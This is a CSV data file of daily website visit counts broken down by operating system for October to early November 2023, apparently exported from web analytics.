date,os,visits
2023-11-01,Tizen,1026
2023-11-01,OS/2,602
2023-11-01,Fuchsia,496
2023-11-01,Firefox OS,476
2023-11-01,Playstation 4,395
2023-11-01,BlackBerry,149
2023-11-01,Windows Phone,102
2023-11-01,OpenBSD,62
2023-11-01,UNIX,51
2023-11-01,Samsung,41
2023-11-01,Mac OS,38
2023-11-01,Xbox,23
2023-11-01,SymbianOS,18
2023-11-01,Sony,9
2023-11-01,NetBSD,7
2023-11-01,Nokia,5
2023-11-01,SunOS,5
2023-11-01,Nintendo WiiU,3
2023-11-01,PalmOS,3
2023-11-01,BeOS,2
2023-11-01,Nintendo 3DS,2
2023-11-01,Playstation Vita,2
2023-10-31,Windows,14246313
2023-10-31,iOS,14056394
2023-10-31,Android,7374196
2023-10-31,Macintosh,4337901
2023-10-31,Linux,1037740
2023-10-31,Chrome OS,979282
2023-10-31,(not set),33954
2023-10-31,FreeBSD,1377
2023-10-31,Tizen,1113
2023-10-31,OS/2,576
2023-10-31,Fuchsia,476
2023-10-31,Firefox OS,458
2023-10-31,Playstation 4,333
2023-10-31,BlackBerry,152
2023-10-31,Windows Phone,84
2023-10-31,UNIX,73
2023-10-31,OpenBSD,59
2023-10-31,Xbox,33
2023-10-31,Samsung,32
2023-10-31,Mac OS,24
2023-10-31,NetBSD,12
2023-10-31,SymbianOS,12
2023-10-31,SunOS,9
2023-10-31,Playstation Vita,7
2023-10-31,Sony,7
2023-10-31,PalmOS,5
2023-10-31,Nokia,3
2023-10-31,iPhone,2
2023-10-31,macOS X,2
2023-10-31,IRIX,1
2023-10-31,MOT,1
2023-10-31,Nintendo 3DS,1
2023-10-31,Nintendo WiiU,1
2023-10-31,Playstation 3,1
2023-10-30,Windows,15283791
2023-10-30,iOS,15220430
2023-10-30,Android,7878695
2023-10-30,Macintosh,4602344
2023-10-30,Linux,1170505
2023-10-30,Chrome OS,1091127
2023-10-30,(not set),22324
2023-10-30,FreeBSD,1313
2023-10-30,Tizen,1196
2023-10-30,OS/2,745
2023-10-30,Fuchsia,548
2023-10-30,Firefox OS,547
2023-10-30,Playstation 4,382
2023-10-30,BlackBerry,146
2023-10-30,Windows Phone,105
2023-10-30,OpenBSD,63
2023-10-30,UNIX,56
2023-10-30,Samsung,54
2023-10-30,Xbox,33
2023-10-30,SunOS,18
2023-10-30,NetBSD,12
2023-10-30,SymbianOS,10
2023-10-30,Mac OS,6
2023-10-30,Sony,6
2023-10-30,WebTV,4
2023-10-30,Nokia,3
2023-10-30,Nintendo Wii,2
2023-10-30,Nintendo WiiU,2
2023-10-30,PalmOS,2
2023-10-30,BeOS,1
2023-10-30,LG,1
2023-10-30,MOT,1
2023-10-30,Nintendo 3DS,1
2023-10-30,Playstation 3,1
2023-10-30,Playstation Portable,1
2023-10-30,Playstation Vita,1
2023-10-30,Solaris,1
2023-10-30,iPhone,1
2023-10-29,iOS,9928275
2023-10-29,Android,5906133
2023-10-29,Windows,5565512
2023-10-29,Macintosh,2756250
2023-10-29,Linux,893403
2023-10-29,Chrome OS,352600
2023-10-29,(not set),16816
2023-10-29,Tizen,1127
2023-10-29,FreeBSD,704
2023-10-29,OS/2,635
2023-10-29,Fuchsia,578
2023-10-29,Firefox OS,457
2023-10-29,Playstation 4,327
2023-10-29,BlackBerry,111
2023-10-29,Windows Phone,88
2023-10-29,Samsung,53
2023-10-29,UNIX,48
2023-10-29,OpenBSD,40
2023-10-29,Xbox,23
2023-10-29,Mac OS,11
2023-10-29,Playstation Vita,11
2023-10-29,NetBSD,9
2023-10-29,SymbianOS,9
2023-10-29,Nokia,8
2023-10-29,Sony,6
2023-10-29,Solaris,4
2023-10-29,Nintendo 3DS,3
2023-10-29,PalmOS,3
2023-10-29,SunOS,3
2023-10-29,BeOS,2
2023-10-29,Playstation 3,2
2023-10-29,macOS X,2
2023-10-29,Nintendo Wii,1
2023-10-29,WebTV,1
2023-10-28,iOS,12349823
2023-10-28,Android,6530683
2023-10-28,Windows,5371740
2023-10-28,Macintosh,2382710
2023-10-28,Linux,1084264
2023-10-28,Chrome OS,271427
2023-10-28,(not set),25835
2023-10-28,Tizen,1067
2023-10-28,FreeBSD,868
2023-10-28,OS/2,603
2023-10-28,Fuchsia,538
2023-10-28,Firefox OS,419
2023-10-28,Playstation 4,368
2023-10-28,BlackBerry,168
2023-10-28,Windows Phone,117
2023-10-28,UNIX,46
2023-10-28,Samsung,45
2023-10-28,OpenBSD,28
2023-10-28,Xbox,24
2023-10-28,Nokia,14
2023-10-28,SymbianOS,13
2023-10-28,SunOS,12
2023-10-28,Mac OS,9
2023-10-28,NetBSD,9
2023-10-28,Playstation Vita,9
2023-10-28,WebTV,8
2023-10-28,Sony,7
2023-10-28,NTT DoCoMo,3
2023-10-28,PalmOS,2
2023-10-28,LG,1
2023-10-28,MOT,1
2023-10-28,Nintendo Wii,1
2023-10-28,macOS X,1
2023-10-27,iOS,14287567
2023-10-27,Windows,12068956
2023-10-27,Android,7540636
2023-10-27,Macintosh,3583454
2023-10-27,Linux,1221604
2023-10-27,Chrome OS,868911
2023-10-27,(not set),25017
2023-10-27,FreeBSD,1441
2023-10-27,Tizen,1139
2023-10-27,OS/2,682
2023-10-27,Fuchsia,538
2023-10-27,Firefox OS,464
2023-10-27,Playstation 4,383
2023-10-27,BlackBerry,132
2023-10-27,Windows Phone,77
2023-10-27,UNIX,66
2023-10-27,Samsung,39
2023-10-27,notWindows,38
2023-10-27,Xbox,33
2023-10-27,OpenBSD,22
2023-10-27,NetBSD,13
2023-10-27,SunOS,13
2023-10-27,Nokia,11
2023-10-27,SymbianOS,8
2023-10-27,Playstation Vita,6
2023-10-27,Mac OS,4
2023-10-27,Nintendo 3DS,3
2023-10-27,Sony,3
2023-10-27,BeOS,1
2023-10-27,MOT,1
2023-10-27,NTT DoCoMo,1
2023-10-27,Nintendo Wii,1
2023-10-27,Nintendo WiiU,1
2023-10-27,PalmOS,1
2023-10-26,iOS,14905235
2023-10-26,Windows,14336495
2023-10-26,Android,8012585
2023-10-26,Macintosh,4110815
2023-10-26,Chrome OS,1088894
2023-10-26,Linux,918059
2023-10-26,(not set),25269
2023-10-26,FreeBSD,2152
2023-10-26,Tizen,1122
2023-10-26,OS/2,674
2023-10-26,Fuchsia,530
2023-10-26,Firefox OS,484
2023-10-26,Playstation 4,404
2023-10-26,BlackBerry,129
2023-10-26,Windows Phone,80
2023-10-26,UNIX,50
2023-10-26,OpenBSD,45
2023-10-26,Samsung,45
2023-10-26,Xbox,35
2023-10-26,NetBSD,20
2023-10-26,SymbianOS,18
2023-10-26,Nokia,15
2023-10-26,Sony,13
2023-10-26,SunOS,12
2023-10-26,Nintendo Wii,11
2023-10-26,Playstation Vita,8
2023-10-26,LG,3
2023-10-26,Playstation 3,3
2023-10-26,Mac OS,2
2023-10-26,PalmOS,2
2023-10-26,BeOS,1
2023-10-26,MOT,1
2023-10-26,Nintendo 3DS,1
2023-10-26,Nintendo WiiU,1
2023-10-25,iOS,15495966
2023-10-25,Windows,15048448
2023-10-25,Android,8034044
2023-10-25,Macintosh,4390497
2023-10-25,Chrome OS,1108870
2023-10-25,Linux,1049974
2023-10-25,(not set),35154
2023-10-25,FreeBSD,1821
2023-10-25,Tizen,1166
2023-10-25,OS/2,674
2023-10-25,Fuchsia,521
2023-10-25,Firefox OS,459
2023-10-25,Playstation 4,372
2023-10-25,BlackBerry,121
2023-10-25,OpenBSD,109
2023-10-25,UNIX,100
2023-10-25,Windows Phone,72
2023-10-25,Samsung,52
2023-10-25,Xbox,34
2023-10-25,SunOS,22
2023-10-25,NetBSD,20
2023-10-25,SymbianOS,15
2023-10-25,Sony,13
2023-10-25,Playstation Vita,10
2023-10-25,Nintendo Wii,7
2023-10-25,Nokia,5
2023-10-25,PalmOS,4
2023-10-25,Nintendo 3DS,3
2023-10-25,Mac OS,2
2023-10-25,Nintendo WiiU,2
2023-10-25,LG,1
2023-10-25,NTT DoCoMo,1
2023-10-25,iPhone,1
2023-10-25,macOS X,1
2023-10-24,iOS,14684372
2023-10-24,Windows,14662590
2023-10-24,Android,7798555
2023-10-24,Macintosh,4377257
2023-10-24,Chrome OS,1131708
2023-10-24,Linux,1104130
2023-10-24,(not set),26955
2023-10-24,FreeBSD,1471
2023-10-24,Tizen,1129
2023-10-24,OS/2,664
2023-10-24,Fuchsia,500
2023-10-24,Firefox OS,408
2023-10-24,Playstation 4,356
2023-10-24,BlackBerry,134
2023-10-24,UNIX,96
2023-10-24,Windows Phone,88
2023-10-24,Samsung,47
2023-10-24,OpenBSD,43
2023-10-24,Xbox,43
2023-10-24,SymbianOS,32
2023-10-24,NetBSD,19
2023-10-24,Playstation Vita,15
2023-10-24,SunOS,10
2023-10-24,Sony,8
2023-10-24,Mac OS,3
2023-10-24,Nintendo WiiU,3
2023-10-24,Solaris,3
2023-10-24,MOT,2
2023-10-24,Nintendo 3DS,2
2023-10-24,Nokia,2
2023-10-24,WebTV,2
2023-10-24,iPhone,2
2023-10-24,LG,1
2023-10-24,NTT DoCoMo,1
2023-10-24,PalmOS,1
2023-10-24,Vodafone,1
2023-10-23,Windows,15357184
2023-10-23,iOS,15027496
2023-10-23,Android,8173124
2023-10-23,Macintosh,4377987
2023-10-23,Chrome OS,1047199
2023-10-23,Linux,902558
2023-10-23,(not set),24239
2023-10-23,FreeBSD,1452
2023-10-23,Tizen,1079
2023-10-23,OS/2,633
2023-10-23,Fuchsia,544
2023-10-23,Firefox OS,416
2023-10-23,Playstation 4,382
2023-10-23,BlackBerry,129
2023-10-23,Windows Phone,94
2023-10-23,UNIX,68
2023-10-23,OpenBSD,43
2023-10-23,Xbox,29
2023-10-23,Samsung,27
2023-10-23,SunOS,24
2023-10-23,SymbianOS,20
2023-10-23,NetBSD,16
2023-10-23,Playstation Vita,14
2023-10-23,Sony,11
2023-10-23,Nokia,7
2023-10-23,macOS X,5
2023-10-23,PalmOS,4
2023-10-23,iPhone,4
2023-10-23,DingOS,2
2023-10-23,LG,2
2023-10-23,NTT DoCoMo,2
2023-10-23,Nintendo 3DS,2
2023-10-23,Nintendo Wii,2
2023-10-23,WebTV,1
2023-10-22,iOS,10813957
2023-10-22,Android,6086559
2023-10-22,Windows,5514478
2023-10-22,Macintosh,2782210
2023-10-22,Linux,895025
2023-10-22,Chrome OS,344225
2023-10-22,(not set),17251
2023-10-22,Tizen,1087
2023-10-22,FreeBSD,660
2023-10-22,OS/2,618
2023-10-22,Fuchsia,527
2023-10-22,Playstation 4,385
2023-10-22,Firefox OS,367
2023-10-22,BlackBerry,121
2023-10-22,UNIX,63
2023-10-22,Windows Phone,60
2023-10-22,OpenBSD,53
2023-10-22,Samsung,48
2023-10-22,SymbianOS,27
2023-10-22,Xbox,27
2023-10-22,NetBSD,17
2023-10-22,Nokia,13
2023-10-22,Playstation Vita,12
2023-10-22,SunOS,12
2023-10-22,Sony,10
2023-10-22,PalmOS,8
2023-10-22,Nintendo 3DS,5
2023-10-22,Nintendo Wii,5
2023-10-22,Mac OS,3
2023-10-22,Nintendo WiiU,3
2023-10-22,MOT,1
2023-10-22,Solaris,1
2023-10-22,macOS X,1
2023-10-21,iOS,12462105
2023-10-21,Android,6792327
2023-10-21,Windows,5330555
2023-10-21,Macintosh,2481321
2023-10-21,Linux,841927
2023-10-21,Chrome OS,287977
2023-10-21,(not set),38988
2023-10-21,Tizen,1143
2023-10-21,FreeBSD,949
2023-10-21,OS/2,568
2023-10-21,Fuchsia,556
2023-10-21,Playstation 4,420
2023-10-21,Firefox OS,401
2023-10-21,BlackBerry,113
2023-10-21,Windows Phone,87
2023-10-21,UNIX,53
2023-10-21,Samsung,49
2023-10-21,OpenBSD,40
2023-10-21,Xbox,34
2023-10-21,Playstation Vita,15
2023-10-21,NetBSD,14
2023-10-21,SymbianOS,14
2023-10-21,Sony,10
2023-10-21,SunOS,9
2023-10-21,Nokia,4
2023-10-21,Nintendo 3DS,3
2023-10-21,LG,2
2023-10-21,PalmOS,2
2023-10-21,MOT,1
2023-10-21,NTT DoCoMo,1
2023-10-21,Nintendo Wii,1
2023-10-21,Playstation 3,1
2023-10-21,Solaris,1
2023-10-21,WebTV,1
2023-10-20,iOS,14814551
2023-10-20,Windows,12126729
2023-10-20,Android,8116252
2023-10-20,Macintosh,3749536
2023-10-20,Linux,920817
2023-10-20,Chrome OS,836221
2023-10-20,(not set),45060
2023-10-20,FreeBSD,1470
2023-10-20,Tizen,1143
2023-10-20,OS/2,634
2023-10-20,Fuchsia,505
2023-10-20,Firefox OS,438
2023-10-20,Playstation 4,404
2023-10-20,BlackBerry,116
2023-10-20,Windows Phone,89
2023-10-20,OpenBSD,56
2023-10-20,UNIX,48
2023-10-20,Samsung,40
2023-10-20,NetBSD,29
2023-10-20,Xbox,29
2023-10-20,Playstation Vita,18
2023-10-20,SymbianOS,18
2023-10-20,SunOS,17
2023-10-20,Nintendo Wii,14
2023-10-20,Sony,12
2023-10-20,Nokia,7
2023-10-20,notWindows,5
2023-10-20,MOT,3
2023-10-20,PalmOS,3
2023-10-20,LG,2
2023-10-20,Nintendo WiiU,1
2023-10-20,WebTV,1
2023-10-20,iPhone,1
2023-10-19,iOS,16395100
2023-10-19,Windows,14361914
2023-10-19,Android,8754434
2023-10-19,Macintosh,4299822
2023-10-19,Chrome OS,1035921
2023-10-19,Linux,903902
2023-10-19,(not set),31188
2023-10-19,FreeBSD,1428
2023-10-19,Tizen,1217
2023-10-19,OS/2,658
2023-10-19,Fuchsia,593
2023-10-19,Firefox OS,443
2023-10-19,Playstation 4,411
2023-10-19,BlackBerry,117
2023-10-19,Windows Phone,89
2023-10-19,UNIX,65
2023-10-19,OpenBSD,60
2023-10-19,Xbox,34
2023-10-19,Samsung,33
2023-10-19,NetBSD,29
2023-10-19,SymbianOS,29
2023-10-19,SunOS,12
2023-10-19,Playstation Vita,11
2023-10-19,Sony,9
2023-10-19,Nokia,8
2023-10-19,Nintendo Wii,5
2023-10-19,WebTV,4
2023-10-19,IRIX,1
2023-10-19,MOT,1
2023-10-19,Nintendo WiiU,1
2023-10-19,PalmOS,1
2023-10-19,Playstation 3,1
2023-10-18,iOS,16165651
2023-10-18,Windows,14926185
2023-10-18,Android,8490184
2023-10-18,Macintosh,4370849
2023-10-18,Chrome OS,1035510
2023-10-18,Linux,851944
2023-10-18,(not set),24944
2023-10-18,FreeBSD,1239
2023-10-18,Tizen,1068
2023-10-18,OS/2,636
2023-10-18,Fuchsia,527
2023-10-18,Firefox OS,437
2023-10-18,Playstation 4,349
2023-10-18,BlackBerry,125
2023-10-18,Windows Phone,85
2023-10-18,UNIX,69
2023-10-18,Samsung,63
2023-10-18,OpenBSD,58
2023-10-18,Xbox,39
2023-10-18,SymbianOS,33
2023-10-18,NetBSD,13
2023-10-18,SunOS,13
2023-10-18,Sony,12
2023-10-18,Playstation Vita,7
2023-10-18,Nintendo 3DS,4
2023-10-18,Nintendo Wii,4
2023-10-18,Nokia,3
2023-10-18,Nintendo WiiU,2
2023-10-18,macOS X,2
2023-10-18,BeOS,1
2023-10-18,LG,1
2023-10-18,Mac OS,1
2023-10-18,PalmOS,1
2023-10-18,Playstation 3,1
2023-10-18,Solaris,1
2023-10-18,WebTV,1
2023-10-17,iOS,15933356
2023-10-17,Windows,15256882
2023-10-17,Android,8118223
2023-10-17,Macintosh,4601405
2023-10-17,Chrome OS,1050696
2023-10-17,Linux,864709
2023-10-17,(not set),24604
2023-10-17,FreeBSD,1278
2023-10-17,Tizen,1052
2023-10-17,OS/2,581
2023-10-17,Fuchsia,536
2023-10-17,Firefox OS,407
2023-10-17,Playstation 4,353
2023-10-17,BlackBerry,124
2023-10-17,Windows Phone,93
2023-10-17,OpenBSD,58
2023-10-17,UNIX,57
2023-10-17,Samsung,47
2023-10-17,SymbianOS,25
2023-10-17,Xbox,25
2023-10-17,NetBSD,22
2023-10-17,SunOS,12
2023-10-17,Unknown,9
2023-10-17,Playstation Vita,8
2023-10-17,macOS X,7
2023-10-17,Nokia,4
2023-10-17,LG,3
2023-10-17,Sony,3
2023-10-17,Nintendo Wii,2
2023-10-17,MOT,1
2023-10-17,NTT DoCoMo,1
2023-10-17,Nintendo WiiU,1
2023-10-17,PalmOS,1
2023-10-17,Playstation 3,1
2023-10-17,Playstation Portable,1
2023-10-16,iOS,16155069
2023-10-16,Windows,15441996
2023-10-16,Android,8520792
2023-10-16,Macintosh,4817803
2023-10-16,Chrome OS,1008029
2023-10-16,Linux,881741
2023-10-16,(not set),23998
2023-10-16,FreeBSD,1535
2023-10-16,Tizen,1143
2023-10-16,OS/2,587
2023-10-16,Fuchsia,517
2023-10-16,Firefox OS,433
2023-10-16,Playstation 4,375
2023-10-16,BlackBerry,139
2023-10-16,OpenBSD,79
2023-10-16,Windows Phone,74
2023-10-16,UNIX,53
2023-10-16,Samsung,51
2023-10-16,Xbox,33
2023-10-16,SymbianOS,24
2023-10-16,SunOS,14
2023-10-16,NetBSD,13
2023-10-16,Sony,13
2023-10-16,Playstation Vita,11
2023-10-16,Nokia,8
2023-10-16,MOT,4
2023-10-16,PalmOS,4
2023-10-16,Solaris,3
2023-10-16,Unknown,3
2023-10-16,macOS X,3
2023-10-16,BeOS,2
2023-10-16,Nintendo 3DS,2
2023-10-16,Nintendo WiiU,2
2023-10-16,IRIX,1
2023-10-16,NTT DoCoMo,1
2023-10-16,Nintendo Wii,1
2023-10-16,Playstation Portable,1
2023-10-16,WebTV,1
2023-10-15,iOS,11220275
2023-10-15,Android,6333603
2023-10-15,Windows,5931538
2023-10-15,Macintosh,2985521
2023-10-15,Linux,721921
2023-10-15,Chrome OS,349288
2023-10-15,(not set),28869
2023-10-15,Tizen,1149
2023-10-15,FreeBSD,611
2023-10-15,OS/2,560
2023-10-15,Fuchsia,505
2023-10-15,Playstation 4,394
2023-10-15,Firefox OS,363
2023-10-15,BlackBerry,92
2023-10-15,OpenBSD,78
2023-10-15,Windows Phone,77
2023-10-15,Samsung,56
2023-10-15,UNIX,54
2023-10-15,NetBSD,26
2023-10-15,SymbianOS,26
2023-10-15,Xbox,25
2023-10-15,SunOS,16
2023-10-15,Sony,12
2023-10-15,Playstation Vita,10
2023-10-15,Nokia,9
2023-10-15,Unknown,5
2023-10-15,NTT DoCoMo,3
2023-10-15,LG,2
2023-10-15,MOT,2
2023-10-15,Nintendo Wii,2
2023-10-15,PalmOS,2
2023-10-15,Mac OS,1
2023-10-15,Playstation Portable,1
2023-10-15,Solaris,1
2023-10-14,iOS,14039427
2023-10-14,Android,7778695
2023-10-14,Windows,5972465
2023-10-14,Macintosh,2825051
2023-10-14,Linux,732256
2023-10-14,Chrome OS,300116
2023-10-14,(not set),29819
2023-10-14,Tizen,2239
2023-10-14,Fuchsia,701
2023-10-14,OS/2,690
2023-10-14,FreeBSD,612
2023-10-14,Playstation 4,430
2023-10-14,Firefox OS,411
2023-10-14,Windows Phone,109
2023-10-14,BlackBerry,92
2023-10-14,OpenBSD,53
2023-10-14,Samsung,45
2023-10-14,UNIX,41
2023-10-14,Xbox,32
2023-10-14,SymbianOS,25
2023-10-14,NetBSD,18
2023-10-14,Sony,9
2023-10-14,Playstation Vita,7
2023-10-14,Nokia,5
2023-10-14,Unknown,5
2023-10-14,Mac OS,4
2023-10-14,Nintendo 3DS,4
2023-10-14,Nintendo WiiU,4
2023-10-14,SunOS,4
2023-10-14,MOT,2
2023-10-14,Nintendo Wii,2
2023-10-14,IRIX,1
2023-10-14,LG,1
2023-10-14,NTT DoCoMo,1
2023-10-14,WebTV,1
2023-10-13,iOS,15241164
2023-10-13,Windows,12381463
2023-10-13,Android,8178339
2023-10-13,Macintosh,3843924
2023-10-13,Chrome OS,797187
2023-10-13,Linux,791103
2023-10-13,(not set),22882
2023-10-13,Tizen,1295
2023-10-13,OS/2,681
2023-10-13,Fuchsia,539
2023-10-13,Firefox OS,493
2023-10-13,Playstation 4,372
2023-10-13,BlackBerry,111
2023-10-13,FreeBSD,103
2023-10-13,Windows Phone,87
2023-10-13,Samsung,60
2023-10-13,UNIX,58
2023-10-13,Xbox,35
2023-10-13,OpenBSD,26
2023-10-13,NetBSD,20
2023-10-13,SymbianOS,14
2023-10-13,SunOS,13
2023-10-13,Mac OS,11
2023-10-13,Unknown,9
2023-10-13,WebTV,9
2023-10-13,Sony,7
2023-10-13,Playstation Vita,6
2023-10-13,Nokia,4
2023-10-13,PalmOS,4
2023-10-13,Nintendo WiiU,3
2023-10-13,Solaris,3
2023-10-13,macOS X,3
2023-10-13,MOT,1
2023-10-12,iOS,15865936
2023-10-12,Windows,14559607
2023-10-12,Android,8553031
2023-10-12,Macintosh,4307999
2023-10-12,Chrome OS,980555
2023-10-12,Linux,838783
2023-10-12,(not set),60588
2023-10-12,Tizen,1289
2023-10-12,OS/2,686
2023-10-12,Fuchsia,573
2023-10-12,Firefox OS,498
2023-10-12,Playstation 4,431
2023-10-12,BlackBerry,153
2023-10-12,FreeBSD,106
2023-10-12,Windows Phone,81
2023-10-12,UNIX,79
2023-10-12,Samsung,45
2023-10-12,Xbox,44
2023-10-12,OpenBSD,40
2023-10-12,SymbianOS,23
2023-10-12,NetBSD,19
2023-10-12,Mac OS,17
2023-10-12,Unknown,15
2023-10-12,Playstation Vita,11
2023-10-12,SunOS,8
2023-10-12,Nokia,5
2023-10-12,WebTV,5
2023-10-12,Nintendo Wii,4
2023-10-12,PalmOS,3
2023-10-12,Sony,3
2023-10-12,Nintendo 3DS,2
2023-10-12,Nintendo WiiU,2
2023-10-12,BeOS,1
2023-10-12,LG,1
2023-10-12,Playstation 3,1
2023-10-12,iPhone,1
2023-10-11,iOS,15278966
2023-10-11,Windows,14787508
2023-10-11,Android,8712277
2023-10-11,Macintosh,4396394
2023-10-11,Chrome OS,971630
2023-10-11,Linux,814007
2023-10-11,(not set),68432
2023-10-11,Tizen,1163
2023-10-11,OS/2,698
2023-10-11,Fuchsia,518
2023-10-11,Firefox OS,492
2023-10-11,Playstation 4,395
2023-10-11,FreeBSD,109
2023-10-11,BlackBerry,108
2023-10-11,Windows Phone,94
2023-10-11,UNIX,54
2023-10-11,OpenBSD,53
2023-10-11,Xbox,33
2023-10-11,NetBSD,23
2023-10-11,Samsung,19
2023-10-11,SunOS,19
2023-10-11,SymbianOS,18
2023-10-11,Mac OS,15
2023-10-11,Unknown,12
2023-10-11,Sony,10
2023-10-11,Nintendo Wii,8
2023-10-11,PalmOS,6
2023-10-11,LG,2
2023-10-11,MOT,2
2023-10-11,Nokia,2
2023-10-11,macOS X,2
2023-10-11,DingOS,1
2023-10-11,Nintendo 3DS,1
2023-10-11,Nintendo WiiU,1
2023-10-11,Playstation Portable,1
2023-10-11,Playstation Vita,1
2023-10-10,iOS,16887845
2023-10-10,Windows,14735932
2023-10-10,Android,8780471
2023-10-10,Macintosh,4521453
2023-10-10,Chrome OS,977517
2023-10-10,Linux,947597
2023-10-10,(not set),48238
2023-10-10,Tizen,1054
2023-10-10,OS/2,664
2023-10-10,Fuchsia,508
2023-10-10,Playstation 4,433
2023-10-10,Firefox OS,424
2023-10-10,BlackBerry,111
2023-10-10,FreeBSD,108
2023-10-10,Windows Phone,83
2023-10-10,UNIX,58
2023-10-10,OpenBSD,39
2023-10-10,Xbox,23
2023-10-10,NetBSD,18
2023-10-10,SymbianOS,18
2023-10-10,Mac OS,16
2023-10-10,SunOS,15
2023-10-10,Sony,8
2023-10-10,Samsung,7
2023-10-10,Solaris,4
2023-10-10,Nintendo Wii,2
2023-10-10,Nokia,2
2023-10-10,PalmOS,2
2023-10-10,BeOS,1
2023-10-10,DingOS,1
2023-10-10,Nintendo 3DS,1
2023-10-09,iOS,13877075
2023-10-09,Windows,11703440
2023-10-09,Android,7805647
2023-10-09,Macintosh,4137044
2023-10-09,Linux,889676
2023-10-09,Chrome OS,720752
2023-10-09,(not set),16046
2023-10-09,Tizen,1090
2023-10-09,Fuchsia,638
2023-10-09,OS/2,634
2023-10-09,Firefox OS,427
2023-10-09,Playstation 4,342
2023-10-09,FreeBSD,107
2023-10-09,BlackBerry,87
2023-10-09,UNIX,86
2023-10-09,Windows Phone,85
2023-10-09,OpenBSD,35
2023-10-09,Xbox,22
2023-10-09,Mac OS,20
2023-10-09,NetBSD,18
2023-10-09,SymbianOS,14
2023-10-09,DingOS,9
2023-10-09,SunOS,9
2023-10-09,Samsung,8
2023-10-09,Sony,6
2023-10-09,Solaris,5
2023-10-09,Nintendo Wii,4
2023-10-09,Playstation Vita,3
2023-10-09,LG,1
2023-10-09,MOT,1
2023-10-09,NTT DoCoMo,1
2023-10-09,PalmOS,1
2023-10-09,Playstation 3,1
2023-10-09,WebTV,1
2023-10-09,macOS X,1
2023-10-08,iOS,10425077
2023-10-08,Android,6283099
2023-10-08,Windows,5281776
2023-10-08,Macintosh,2655138
2023-10-08,Linux,771942
2023-10-08,Chrome OS,324592
2023-10-08,(not set),15287
2023-10-08,Tizen,991
2023-10-08,OS/2,577
2023-10-08,Fuchsia,518
